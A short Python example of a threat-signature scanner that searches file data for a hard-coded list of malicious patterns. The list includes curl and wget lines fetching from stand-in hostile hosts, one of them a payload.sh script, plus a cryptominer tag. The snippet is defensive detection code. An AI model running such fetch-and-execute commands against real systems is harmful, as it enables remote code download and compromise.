# Example library of known malicious patterns or signatures
# For real usage, you'd store these in a JSON or database.
KNOWN_SIGNATURES = [
    b"curl http://malicious.com",          # a known command injection pattern
    b"MINER_START",                        # hypothetical cryptominer start tag
    b"wget http://somebadsite/payload.sh", # another malicious pattern
]

def run_threat_signature_check(file_path, data):
    """
    Scans code or binary data for known malicious signatures.
    'data' can be either text or bytes. Convert if needed.
    """
    warnings = []
    # If text, convert to bytes for consistent scanning
    if isinstance(data, str):
        data = data.encode("utf-8", errors="ignore")

    for sig in KNOWN_SIGNATURES:
        if sig in data:
            warnings.append(f"Known malicious signature found in {file_path}: {sig.decode('utf-8','ignore')}")
    return warnings
